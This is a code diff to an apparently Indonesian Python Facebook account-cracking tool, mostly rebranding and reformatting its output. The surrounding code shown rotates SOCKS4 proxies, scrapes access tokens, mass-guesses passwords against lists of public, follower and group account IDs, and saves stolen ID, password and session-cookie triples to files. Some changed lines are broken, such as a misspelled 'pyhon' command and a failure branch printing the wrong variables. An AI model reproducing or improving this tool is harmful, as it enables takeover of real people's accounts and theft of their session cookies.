@@ -36,7 +36,7 @@ cokbrut=[]
 ses=requests.Session()
 princp=[]
 try:
-	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=us,sp,jp&ssl=all&anonymity=all').text
 	open('.prox.txt','w').write(prox)
 except Exception as e:
 	prox=open('.prox.txt','r').read().splitlines()
@@ -174,12 +174,18 @@ def login_lagi334():
 		find_token = re.search("(EAAG\w+)", data.text)
 		ken=open(".token.txt", "w").write(find_token.group(1));bot()
 		cok=open(".cok.txt", "w").write(cookie)
-		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL.........ANJAY BISA MASUK{x} ');time.sleep(1)
-		exit()
+		wel='# ANJAY BISA MASUK'
+		wel2=mark(wel, style='green')
+		sol().print(wel2, style='white')
+		print(f'[{k}#{x}] MOHON TUNNGU YAH...')
+		time.sleep(1)
+		os.system('pyhon season.py')
 	except Exception as e:
 		os.system("rm -f .token.txt")
 		os.system("rm -f .cok.txt")
-		print(f'  %s[%sx%s]%s LOGIN GAGAL.....JANGAN NANGIS%s'%(x,k,x,m,x))
+		gl='# YAH GAGAL MASUK, JANGAN NAGIS'
+		lg=mark(wel, style='red')
+		sol().print(wel2, style='white')
 		exit()
 def bot():
 	try:
@@ -207,7 +213,7 @@ def menu(my_name,my_id):
 	print(f'[{H}•{N}] Your Idz : '+str(my_id))
 	print(f'[{H}•{N}] Your Ip  : {ip}')
 	print('')
-	an = f'[01] Crack Publik     [02] Crack Publik/Masal\n[03] Crack Followers      [04] Crack Grup\n[05] Crack File      [06] Hasil Crack\n[00] Keluar'
+	an = f'[01] Crack Publik         [02] Crack Publik/Masal\n[03] Crack Followers      [04] Crack Grup\n[05] Crack File           [06] Hasil Crack\n[00] Keluar'
 	na = nel(an, style='cyan')
 	cetak(nel(na, title='MENU-CRACK'))
 	print(f'\n[{k}•{N}] Pilih')
@@ -768,7 +774,7 @@ def crack(idf,pwv):
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print(f'\r{x}╰──> {H}{idf}|{pw}|{kuki}{N}')
+					print(f'\r{x}╰──> {H}{idf}|{pw}\n  ╰──> {kuki}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					break
 				elif 'ya' in taplikasi:
@@ -783,7 +789,7 @@ def crack(idf,pwv):
 					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
 					nok=1
 					for muncul in apkaktif:
-						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
+						infoakun+= (f" ╰──> {x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
 						nok+=1
 
 					hit=0
@@ -791,7 +797,7 @@ def crack(idf,pwv):
 					hit=0
 					for muncul in apkexp:
 						hit+=1
-						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
+						infoakun += (f"	╰──> {x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
 					print(f'\r{x}╰──> {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')
 					ok+=1
 					break
@@ -883,7 +889,7 @@ def cracktouch(idf,pwv):
 					ceker(idf,pw)
 				elif 'ya' in princp:
 					print('\n')
-					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
+					statuscp = f' ╰──> {idf} | {pw}'
 					statuscp1 = nel(statuscp, style='red')
 					cetak(nel(statuscp1, title='AOREC-XD CP'))
 					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -898,9 +904,9 @@ def cracktouch(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+					statusok = f' ╰──> {idf} | {pw}\n  ╰──> {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='AOREC-XD OK'))
+					cetak(nel(statusok1, title='KUMIS-XD CP'))
 					ok+=1
 					break
 				elif 'ya' in taplikasi:
@@ -927,9 +933,9 @@ def cracktouch(idf,pwv):
 						hit+=1
 						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
 					print('\n')
-					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
+					statusok = f' ╰──>{idf} | {pw}\n  ╰──> {kuki}\n    ╰──> {infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]KUMIS-XD-XD OK[/bold green]'))
 					ok+=1
 					break
 
@@ -966,9 +972,9 @@ def crackmbasic(idf,pwv):
 					ceker(idf,pw)
 				elif 'ya' in princp:
 					print('\n')
-					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
+					statuscp = f' ╰──> {idf} | {pw}'
 					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='AOREC-XD CP'))
+					cetak(nel(statuscp1, title='KUMIS-XD CP'))
 					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
@@ -981,7 +987,7 @@ def crackmbasic(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+					statusok = f' ╰──> {idf} | {pw}\n   ╰──> {kuki}'
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='OK'))
 					ok+=1
@@ -999,20 +1005,20 @@ def crackmbasic(idf,pwv):
 					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
 					nok=1
 					for muncul in apkaktif:
-						infoakun+= (f"{x}╰──> [bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
+						infoakun+= (f"{x} ╰──> [{nok}] {muncul[0]} {muncul[1]}\n")
 						nok+=1
 
 					hit=0
-					infoakun += (f"\n{x}╰──> [bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
+					infoakun += (f"\n{x} ╰──> [•] LIST EXPIRED APPLICATIONS :\n")
 					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
 					hit=0
 					for muncul in apkexp:
 						hit+=1
-						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
+						infoakun += (f" ╰──> [{hit}] {muncul[0]} {muncul[1]}\n")
 					print('\n')
-					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
+					statusok = f' ╰──> {idf} | {pw}\n    ╰──> {kuki}\n     ╰──> {infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]KUMIS-XD OK[/bold green]'))
 					ok+=1
 					break
 			else:
